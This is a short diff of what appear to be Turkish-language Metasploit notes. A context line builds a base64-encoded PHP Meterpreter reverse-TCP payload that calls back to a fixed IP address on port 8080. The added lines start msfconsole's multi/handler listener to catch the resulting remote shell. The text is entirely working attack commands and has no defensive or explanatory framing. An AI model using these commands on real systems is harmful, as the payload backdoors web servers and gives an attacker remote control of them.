@@ -62,6 +62,14 @@ Encoded Meterpeter Olusturma
 msfpayload php/meterpreter/reverse_tcp LHOST=85.95.238.172 LPORT=8080 R | msfencode -e php/base64 -t raw > encoded.txt
 
 Dinleme moduna gecme
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 85.95.238.172
+set LPORT 8080
+exploit
+
+
 
 
 
